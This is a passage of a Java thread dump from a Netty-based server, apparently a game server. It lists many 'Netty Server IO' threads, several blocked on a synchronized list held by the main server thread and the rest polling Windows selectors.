io.netty.channel.DefaultChannelPipeline.callHandlerAddedForAllHandlers(DefaultChannelPipeline.java:1161)… “Netty Server IO #47” Id=717 BLOCKED on java.util.Collections$SynchronizedRandomAccessList@206966ed owned by “Server thread” Id=40at java.util.Collections$SynchronizedCollection.add(Unknown Source)- blocked on java.util.Collections$SynchronizedRandomAccessList@206966edat aax$1.initChannel(SourceFile:108)at io.netty.channel.ChannelInitializer.initChannel(ChannelInitializer.java:113)at io.netty.channel.ChannelInitializer.handlerAdded(ChannelInitializer.java:105)at io.netty.channel.DefaultChannelPipeline.callHandlerAdded0(DefaultChannelPipeline.java:637)at io.netty.channel.DefaultChannelPipeline.access$000(DefaultChannelPipeline.java:46)at io.netty.channel.DefaultChannelPipeline$PendingHandlerAddedTask.execute(DefaultChannelPipeline.java:1487)at io.netty.channel.DefaultChannelPipeline.callHandlerAddedForAllHandlers(DefaultChannelPipeline.java:1161)… “Netty Server IO #46” Id=716 BLOCKED on java.util.Collections$SynchronizedRandomAccessList@206966ed owned by “Server thread” Id=40at java.util.Collections$SynchronizedCollection.add(Unknown Source)- blocked on java.util.Collections$SynchronizedRandomAccessList@206966edat aax$1.initChannel(SourceFile:108)at io.netty.channel.ChannelInitializer.initChannel(ChannelInitializer.java:113)at io.netty.channel.ChannelInitializer.handlerAdded(ChannelInitializer.java:105)at io.netty.channel.DefaultChannelPipeline.callHandlerAdded0(DefaultChannelPipeline.java:637)at io.netty.channel.DefaultChannelPipeline.access$000(DefaultChannelPipeline.java:46)at io.netty.channel.DefaultChannelPipeline$PendingHandlerAddedTask.execute(DefaultChannelPipeline.java:1487)at io.netty.channel.DefaultChannelPipeline.callHandlerAddedForAllHandlers(DefaultChannelPipeline.java:1161)… “Netty Server IO #45” Id=715 BLOCKED on java.util.Collections$SynchronizedRandomAccessList@206966ed owned by “Server thread” Id=40at java.util.Collections$SynchronizedCollection.add(Unknown Source)- blocked on java.util.Collections$SynchronizedRandomAccessList@206966edat aax$1.initChannel(SourceFile:108)at io.netty.channel.ChannelInitializer.initChannel(ChannelInitializer.java:113)at io.netty.channel.ChannelInitializer.handlerAdded(ChannelInitializer.java:105)at io.netty.channel.DefaultChannelPipeline.callHandlerAdded0(DefaultChannelPipeline.java:637)at io.netty.channel.DefaultChannelPipeline.access$000(DefaultChannelPipeline.java:46)at io.netty.channel.DefaultChannelPipeline$PendingHandlerAddedTask.execute(DefaultChannelPipeline.java:1487)at io.netty.channel.DefaultChannelPipeline.callHandlerAddedForAllHandlers(DefaultChannelPipeline.java:1161)… “Netty Server IO #44” Id=714 BLOCKED on java.util.Collections$SynchronizedRandomAccessList@206966ed owned by “Server thread” Id=40at java.util.Collections$SynchronizedCollection.add(Unknown Source)- blocked on java.util.Collections$SynchronizedRandomAccessList@206966edat aax$1.initChannel(SourceFile:108)at io.netty.channel.ChannelInitializer.initChannel(ChannelInitializer.java:113)at io.netty.channel.ChannelInitializer.handlerAdded(ChannelInitializer.java:105)at io.netty.channel.DefaultChannelPipeline.callHandlerAdded0(DefaultChannelPipeline.java:637)at io.netty.channel.DefaultChannelPipeline.access$000(DefaultChannelPipeline.java:46)at io.netty.channel.DefaultChannelPipeline$PendingHandlerAddedTask.execute(DefaultChannelPipeline.java:1487)at io.netty.channel.DefaultChannelPipeline.callHandlerAddedForAllHandlers(DefaultChannelPipeline.java:1161)… “Netty Server IO #43” Id=713 BLOCKED on java.util.Collections$SynchronizedRandomAccessList@206966ed owned by “Server thread” Id=40at java.util.Collections$SynchronizedCollection.add(Unknown Source)- blocked on java.util.Collections$SynchronizedRandomAccessList@206966edat aax$1.initChannel(SourceFile:108)at io.netty.channel.ChannelInitializer.initChannel(ChannelInitializer.java:113)at io.netty.channel.ChannelInitializer.handlerAdded(ChannelInitializer.java:105)at io.netty.channel.DefaultChannelPipeline.callHandlerAdded0(DefaultChannelPipeline.java:637)at io.netty.channel.DefaultChannelPipeline.access$000(DefaultChannelPipeline.java:46)at io.netty.channel.DefaultChannelPipeline$PendingHandlerAddedTask.execute(DefaultChannelPipeline.java:1487)at io.netty.channel.DefaultChannelPipeline.callHandlerAddedForAllHandlers(DefaultChannelPipeline.java:1161)… “Netty Server IO #42” Id=712 BLOCKED on java.util.Collections$SynchronizedRandomAccessList@206966ed owned by “Server thread” Id=40at java.util.Collections$SynchronizedCollection.add(Unknown Source)- blocked on java.util.Collections$SynchronizedRandomAccessList@206966edat aax$1.initChannel(SourceFile:108)at io.netty.channel.ChannelInitializer.initChannel(ChannelInitializer.java:113)at io.netty.channel.ChannelInitializer.handlerAdded(ChannelInitializer.java:105)at io.netty.channel.DefaultChannelPipeline.callHandlerAdded0(DefaultChannelPipeline.java:637)at io.netty.channel.DefaultChannelPipeline.access$000(DefaultChannelPipeline.java:46)at io.netty.channel.DefaultChannelPipeline$PendingHandlerAddedTask.execute(DefaultChannelPipeline.java:1487)at io.netty.channel.DefaultChannelPipeline.callHandlerAddedForAllHandlers(DefaultChannelPipeline.java:1161)… “Netty Server IO #41” Id=711 BLOCKED on java.util.Collections$SynchronizedRandomAccessList@206966ed owned by “Server thread” Id=40at java.util.Collections$SynchronizedCollection.add(Unknown Source)- blocked on java.util.Collections$SynchronizedRandomAccessList@206966edat aax$1.initChannel(SourceFile:108)at io.netty.channel.ChannelInitializer.initChannel(ChannelInitializer.java:113)at io.netty.channel.ChannelInitializer.handlerAdded(ChannelInitializer.java:105)at io.netty.channel.DefaultChannelPipeline.callHandlerAdded0(DefaultChannelPipeline.java:637)at io.netty.channel.DefaultChannelPipeline.access$000(DefaultChannelPipeline.java:46)at io.netty.channel.DefaultChannelPipeline$PendingHandlerAddedTask.execute(DefaultChannelPipeline.java:1487)at io.netty.channel.DefaultChannelPipeline.callHandlerAddedForAllHandlers(DefaultChannelPipeline.java:1161)… “Netty Server IO #40” Id=710 BLOCKED on java.util.Collections$SynchronizedRandomAccessList@206966ed owned by “Server thread” Id=40at java.util.Collections$SynchronizedCollection.add(Unknown Source)- blocked on java.util.Collections$SynchronizedRandomAccessList@206966edat aax$1.initChannel(SourceFile:108)at io.netty.channel.ChannelInitializer.initChannel(ChannelInitializer.java:113)at io.netty.channel.ChannelInitializer.handlerAdded(ChannelInitializer.java:105)at io.netty.channel.DefaultChannelPipeline.callHandlerAdded0(DefaultChannelPipeline.java:637)at io.netty.channel.DefaultChannelPipeline.access$000(DefaultChannelPipeline.java:46)at io.netty.channel.DefaultChannelPipeline$PendingHandlerAddedTask.execute(DefaultChannelPipeline.java:1487)at io.netty.channel.DefaultChannelPipeline.callHandlerAddedForAllHandlers(DefaultChannelPipeline.java:1161)… “Netty Server IO #39” Id=709 BLOCKED on java.util.Collections$SynchronizedRandomAccessList@206966ed owned by “Server thread” Id=40at java.util.Collections$SynchronizedCollection.add(Unknown Source)- blocked on java.util.Collections$SynchronizedRandomAccessList@206966edat aax$1.initChannel(SourceFile:108)at io.netty.channel.ChannelInitializer.initChannel(ChannelInitializer.java:113)at io.netty.channel.ChannelInitializer.handlerAdded(ChannelInitializer.java:105)at io.netty.channel.DefaultChannelPipeline.callHandlerAdded0(DefaultChannelPipeline.java:637)at io.netty.channel.DefaultChannelPipeline.access$000(DefaultChannelPipeline.java:46)at io.netty.channel.DefaultChannelPipeline$PendingHandlerAddedTask.execute(DefaultChannelPipeline.java:1487)at io.netty.channel.DefaultChannelPipeline.callHandlerAddedForAllHandlers(DefaultChannelPipeline.java:1161)… “Netty Server IO #38” Id=708 BLOCKED on java.util.Collections$SynchronizedRandomAccessList@206966ed owned by “Server thread” Id=40at java.util.Collections$SynchronizedCollection.add(Unknown Source)- blocked on java.util.Collections$SynchronizedRandomAccessList@206966edat aax$1.initChannel(SourceFile:108)at io.netty.channel.ChannelInitializer.initChannel(ChannelInitializer.java:113)at io.netty.channel.ChannelInitializer.handlerAdded(ChannelInitializer.java:105)at io.netty.channel.DefaultChannelPipeline.callHandlerAdded0(DefaultChannelPipeline.java:637)at io.netty.channel.DefaultChannelPipeline.access$000(DefaultChannelPipeline.java:46)at io.netty.channel.DefaultChannelPipeline$PendingHandlerAddedTask.execute(DefaultChannelPipeline.java:1487)at io.netty.channel.DefaultChannelPipeline.callHandlerAddedForAllHandlers(DefaultChannelPipeline.java:1161)… “Netty Server IO #37” Id=704 RUNNABLEat sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method)at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(Unknown Source)at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(Unknown Source)at sun.nio.ch.WindowsSelectorImpl.doSelect(Unknown Source)at sun.nio.ch.SelectorImpl.lockAndDoSelect(Unknown Source)- locked io.netty.channel.nio.SelectedSelectionKeySet@2eae9c90- locked java.util.Collections$UnmodifiableSet@2a910d9d- locked sun.nio.ch.WindowsSelectorImpl@6f9396abat sun.nio.ch.SelectorImpl.select(Unknown Source)at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62)at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:756)… “Netty Server IO #36” Id=703 RUNNABLE (in native)at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method)at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(Unknown Source)at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(Unknown Source)at sun.nio.ch.WindowsSelectorImpl.doSelect(Unknown Source)at sun.nio.ch.SelectorImpl.lockAndDoSelect(Unknown Source)- locked io.netty.channel.nio.SelectedSelectionKeySet@4a6dbba- locked java.util.Collections$UnmodifiableSet@5e369da2- locked sun.nio.ch.WindowsSelectorImpl@7ce98e1cat sun.nio.ch.SelectorImpl.select(Unknown Source)at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62)at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:756)… “Netty Server IO #35” Id=679 RUNNABLE (in native)at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method)at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(Unknown Source)at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(Unknown Source)at sun.nio.ch.WindowsSelectorImpl.doSelect(Unknown Source)at sun.nio.ch.SelectorImpl.lockAndDoSelect(Unknown Source)- locked io.netty.channel.nio.SelectedSelectionKeySet@fbc69e4- locked java.util.Collections$UnmodifiableSet@3d7518a2- locked sun.nio.ch.WindowsSelectorImpl@57445923at sun.nio.ch.SelectorImpl.select(Unknown Source)at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62)at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:756)… “Netty Server IO #34” Id=652 RUNNABLE (in native)at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method)at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(Unknown Source)at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(Unknown Source)at sun.nio.ch.WindowsSelectorImpl.doSelect(Unknown Source)at sun.nio.ch.SelectorImpl.lockAndDoSelect(Unknown Source)- locked io.netty.channel.nio.SelectedSelectionKeySet@67eda4b9- locked java.util.Collections$UnmodifiableSet@bf212e9- locked sun.nio.ch.WindowsSelectorImpl@1e57bb3dat sun.nio.ch.SelectorImpl.select(Unknown Source)at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62)at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:756)… “Netty Server IO #33” Id=614 RUNNABLEat sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method)at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(Unknown Source)at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(Unknown Source)at sun.nio.ch.WindowsSelectorImpl.doSelect(Unknown Source)at sun.nio.ch.SelectorImpl.lockAndDoSelect(Unknown Source)- locked io.netty.channel.nio.SelectedSelectionKeySet@6baf6495- locked java.util.Collections$UnmodifiableSet@616ddd35- locked sun.nio.ch.WindowsSelectorImpl@7a13feabat sun.nio.ch.SelectorImpl.select(Unknown Source)at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62)at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:756)… “Netty Server IO #32” Id=552 RUNNABLE (in native)at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method)at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(Unknown Source)at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(Unknown Source)at sun.nio.ch.WindowsSelectorImpl.doSelect(Unknown Source)at sun.nio.ch.SelectorImpl.lockAndDoSelect(Unknown Source)- locked io.netty.channel.nio.SelectedSelectionKeySet@59be3c87- locked java.util.Collections$UnmodifiableSet@49a560e9- locked sun.nio.ch.WindowsSelectorImpl@46ae989dat sun.nio.ch.SelectorImpl.select(Unknown Source)at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62)at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:756)… “Netty Server IO #31” Id=544 RUNNABLE (in native)at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method)at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(Unknown Source)at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(Unknown Source)at sun.nio.ch.WindowsSelectorImpl.doSelect(Unknown Source)at sun.nio.ch.SelectorImpl.lockAndDoSelect(Unknown Source)- locked io.netty.channel.nio.SelectedSelectionKeySet@232dc045- locked java.util.Collections$UnmodifiableSet@b5f8aa3- locked sun.nio.ch.WindowsSelectorImpl@699f1109at sun.nio.ch.SelectorImpl.select(Unknown Source)at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62)at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:756)… “Netty Server IO #30” Id=408 RUNNABLE (in native)at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method)at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(Unknown Source)at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(Unknown Source)at sun.nio.ch.WindowsSelectorImpl.doSelect(Unknown Source)at sun.nio.ch.SelectorImpl.lockAndDoSelect(Unknown Source)- locked io.netty.channel.nio.SelectedSelectionKeySet@5b4716d7- locked java.util.Collections$UnmodifiableSet@16a5da12- locked sun.nio.ch.WindowsSelectorImpl@61d850f7at sun.nio.ch.SelectorImpl.select(Unknown Source)at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62)at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:756)… “Netty Server IO #29” Id=407 RUNNABLE (in native)at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method)at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(Unknown Source)at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(Unknown Source)at sun.nio.ch.WindowsSelectorImpl.doSelect(Unknown Source)at sun.nio.ch.SelectorImpl.lockAndDoSelect(Unknown Source)- locked io.netty.channel.nio.SelectedSelectionKeySet@70de029c- locked java.util.Collections$UnmodifiableSet@134c43fe- locked sun.nio.ch.WindowsSelectorImpl@2b816ecfat sun.nio.ch.SelectorImpl.select(Unknown Source)at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62)at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:756)… “Netty Server IO #28” Id=403 RUNNABLE (in native)at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method)at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(Unknown Source)at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(Unknown Source)at sun.nio.ch.WindowsSelectorImpl.doSelect(Unknown Source)at sun.nio.ch.SelectorImpl.lockAndDoSelect(Unknown Source)- locked io.netty.channel.nio.SelectedSelectionKeySet@8fddca0- locked java.util.Collections$UnmodifiableSet@837f5c1- locked sun.nio.ch.WindowsSelectorImpl@7995148aat sun.nio.ch.SelectorImpl.select(Unknown Source)at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62)at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:756)… “Netty Server IO #27” Id=359 RUNNABLEat sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method)at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(Unknown Source)at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(Unknown Source)at sun.nio.ch.WindowsSelectorImpl.doSelect(Unknown Source)at sun.nio.ch.SelectorImpl.lockAndDoSelect(Unknown Source)- locked io.netty.channel.nio.SelectedSelectionKeySet@5942ea61- locked java.util.Collections$UnmodifiableSet@3fbc3535- locked sun.nio.ch.WindowsSelectorImpl@89256feat sun.nio.ch.SelectorImpl.select(Unknown Source)at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62)at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:756)… “Netty Server IO #26” Id=313 RUNNABLEat sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method)at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(Unknown Source)at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(Unknown Source)at sun.nio.ch.WindowsSelectorImpl.doSelect(Unknown Source)at sun.nio.ch.SelectorImpl.lockAndDoSelect(Unknown Source)- locked io.netty.channel.nio.SelectedSelectionKeySet@59f23222- locked java.util.Collections$UnmodifiableSet@172dda9f- locked sun.nio.ch.WindowsSelectorImpl@49e650d2at sun.nio.ch.SelectorImpl.select(Unknown Source)at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62)at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:756)… “Netty Server IO #25” Id=312 RUNNABLEat sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method)at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(Unknown Source)at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(Unknown Source)at sun.nio.ch.WindowsSelectorImpl.doSelect(Unknown Source)at sun.nio.ch.SelectorImpl.lockAndDoSelect(Unknown Source)- locked io.netty.channel.nio.SelectedSelectionKeySet@53d9cab6- locked java.util.Collections$UnmodifiableSet@1bf291cd- locked sun.nio.ch.WindowsSelectorImpl@6272590eat sun.nio.ch.SelectorImpl.select(Unknown Source)at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62)at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:756)… “Netty Server IO #24” Id=311 RUNNABLEat sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method)at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(Unknown Source)at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(Unknown Source)at sun.nio.ch.WindowsSelectorImpl.doSelect(Unknown Source)at sun.nio.ch.SelectorImpl.lockAndDoSelect(Unknown Source)- locked io.netty.channel.nio.SelectedSelectionKeySet@19e9e552- locked java.util.Collections$UnmodifiableSet@47810a3- locked sun.nio.ch.WindowsSelectorImpl@b0b9518at sun.nio.ch.SelectorImpl.select(Unknown Source)at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62)at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:756)… “Netty Server IO #23” Id=294 RUNNABLE (in native)at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method)at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(Unknown Source)at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(Unknown Source)at sun.nio.ch.WindowsSelectorImpl.doSelect(Unknown Source)at sun.nio.ch.SelectorImpl.lockAndDoSelect(Unknown Source)- locked io.netty.channel.nio.SelectedSelectionKeySet@7bc1075e- locked java.util.Collections$UnmodifiableSet@2d54be01- locked sun.nio.ch.WindowsSelectorImpl@696d4e00at sun.nio.ch.SelectorImpl.select(Unknown Source)at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62)at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:756)… “Netty Server IO #22” Id=293 RUNNABLE (in native)at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method)at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(Unknown Source)at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(Unknown Source)at sun.nio.ch.WindowsSelectorImpl.doSelect(Unknown Source)at sun.nio.ch.SelectorImpl.lockAndDoSelect(Unknown Source)- locked io.netty.channel.nio.SelectedSelectionKeySet@3e99a560- locked java.util.Collections$UnmodifiableSet@4d11be1a- locked sun.nio.ch.WindowsSelectorImpl@453db50fat sun.nio.ch.SelectorImpl.select(Unknown Source)at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62)at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:756)… “Netty Server IO #21” Id=292 RUNNABLE (in native)at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method)at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(Unknown Source)at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(Unknown Source)at sun.nio.ch.WindowsSelectorImpl.doSelect(Unknown Source)at sun.nio.ch.SelectorImpl.lockAndDoSelect(Unknown Source)- locked io.netty.channel.nio.SelectedSelectionKeySet@46a3eee6- locked java.util.Collections$UnmodifiableSet@3562e1f7- locked sun.nio.ch.WindowsSelectorImpl@75c3782fat sun.nio.ch.SelectorImpl.select(Unknown Source)at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62)at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:756)… “Netty Server IO #20” Id=291 RUNNABLE (in native)at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method)at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(Unknown Source)at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(Unknown Source)at sun.nio.ch.WindowsSelectorImpl.doSelect(Unknown Source)at sun.nio.ch.SelectorImpl.lockAndDoSelect(Unknown Source)- locked io.netty.channel.nio.SelectedSelectionKeySet@5dfe3e55- locked java.util.Collections$UnmodifiableSet@4f33fd2- locked sun.nio.ch.WindowsSelectorImpl@263c1be2at sun.nio.ch.SelectorImpl.select(Unknown Source)at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62)at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:756)… “Netty Server IO #19” Id=290 RUNNABLE (in native)at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method)at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(Unknown Source)at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(Unknown Source)at sun.nio.ch.WindowsSelectorImpl.doSelect(Unknown Source)at sun.nio.ch.SelectorImpl.lockAndDoSelect(Unknown Source)- locked io.netty.channel.nio.SelectedSelectionKeySet@48d01d0a- locked java.util.Collections$UnmodifiableSet@64709ed3- locked sun.nio.ch.WindowsSelectorImpl@79603020at sun.nio.ch.SelectorImpl.select(Unknown Source)at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62)at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:756)… “Netty Server IO #18” Id=289 RUNNABLE (in native)at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method)at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(Unknown Source)at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(Unknown Source)at sun.nio.ch.WindowsSelectorImpl.doSelect(Unknown Source)at sun.nio.ch.SelectorImpl.lockAndDoSelect(Unknown Source)- locked io.netty.channel.nio.SelectedSelectionKeySet@3f45d7e5- locked java.util.Collections$UnmodifiableSet@7735b54a- locked sun.nio.ch.WindowsSelectorImpl@17532b79at sun.nio.ch.SelectorImpl.select(Unknown Source)at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62)at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:756)… “Netty Server IO #17” Id=288 RUNNABLE (in native)at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method)at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(Unknown Source)at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(Unknown Source)at sun.nio.ch.WindowsSelectorImpl.doSelect(Unknown Source)at sun.nio.ch.SelectorImpl.lockAndDoSelect(Unknown Source)- locked io.netty.channel.nio.SelectedSelectionKeySet@6fcaf883- locked java.util.Collections$UnmodifiableSet@7ea1f060- locked sun.nio.ch.WindowsSelectorImpl@2464951bat sun.nio.ch.SelectorImpl.select(Unknown Source)at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62)at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:756)… “Netty Server IO #16” Id=287 RUNNABLE (in native)at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method)at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(Unknown Source)at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(Unknown Source)at sun.nio.ch.WindowsSelectorImpl.doSelect(Unknown Source)at sun.nio.ch.SelectorImpl.lockAndDoSelect(Unknown Source)- locked io.netty.channel.nio.SelectedSelectionKeySet@2ae26a0d- locked java.util.Collections$UnmodifiableSet@12d48132- locked sun.nio.ch.WindowsSelectorImpl@630751f8at sun.nio.ch.SelectorImpl.select(Unknown Source)at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62)at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:756)… “Netty Server IO #15” Id=286 RUNNABLE (in native)at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method)at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(Unknown Source)at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(Unknown Source)at sun.nio.ch.WindowsSelectorImpl.doSelect(Unknown Source)at sun.nio.ch.SelectorImpl.lockAndDoSelect(Unknown Source)- locked io.netty.channel.nio.SelectedSelectionKeySet@634bccce- locked java.util.Collections$UnmodifiableSet@5ac070a8- locked sun.nio.ch.WindowsSelectorImpl@6cabb7d3at sun.nio.ch.SelectorImpl.select(Unknown Source)at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62)at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:756)… “Netty Server IO #14” Id=236 RUNNABLEat sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method)at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(Unknown Source)at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(Unknown Source)at sun.nio.ch.WindowsSelectorImpl.doSelect(Unknown Source)at sun.nio.ch.SelectorImpl.lockAndDoSelect(Unknown Source)- locked io.netty.channel.nio.SelectedSelectionKeySet@35fab32f- locked java.util.Collections$UnmodifiableSet@8ea24e2- locked sun.nio.ch.WindowsSelectorImpl@51f65067at sun.nio.ch.SelectorImpl.select(Unknown Source)at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62)at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:756)… “Netty Server IO #13” Id=219 RUNNABLEat sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method)at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(Unknown Source)at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(Unknown Source)at sun.nio.ch.WindowsSelectorImpl.doSelect(Unknown Source)at sun.nio.ch.SelectorImpl.lockAndDoSelect(Unknown Source)- locked io.netty.channel.nio.SelectedSelectionKeySet@605260a5- locked java.util.Collections$UnmodifiableSet@d1d44b- locked sun.nio.ch.WindowsSelectorImpl@59452d87at sun.nio.ch.SelectorImpl.select(Unknown Source)at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62)at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:756)… “Netty Server IO #12” Id=209 RUNNABLE (in native)at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method)at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(Unknown Source)at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(Unknown Source)at sun.nio.ch.WindowsSelectorImpl.doSelect(Unknown Source)at sun.nio.ch.SelectorImpl.lockAndDoSelect(Unknown Source)- locked io.netty.channel.nio.SelectedSelectionKeySet@3ad33ba0- locked java.util.Collections$UnmodifiableSet@49f73317- locked sun.nio.ch.WindowsSelectorImpl@470ad5eeat sun.nio.ch.SelectorImpl.select(Unknown Source)at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62)at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:756)… “Netty Server IO #11” Id=208 RUNNABLE (in native)at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method)at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(Unknown Source)at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(Unknown Source)at sun.nio.ch.WindowsSelectorImpl.doSelect(Unknown Source)at sun.nio.ch.SelectorImpl.lockAndDoSelect(Unknown Source)- locked 